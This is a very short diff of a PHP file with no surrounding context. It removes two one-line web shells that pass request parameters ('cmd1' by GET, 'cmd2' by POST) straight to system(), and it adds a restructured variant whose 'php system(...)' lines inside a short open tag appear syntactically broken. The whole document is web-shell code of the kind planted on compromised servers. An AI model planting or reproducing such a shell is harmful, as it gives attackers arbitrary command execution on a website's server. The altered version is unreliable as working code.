@@ -1,2 +1,4 @@
-<?php system($_GET['cmd1']); ?>
-<?php system($_POST['cmd2']); ?>
+<?
+  php system($_GET['cmd1']); 
+  php system($_POST['cmd2']); 
+?>
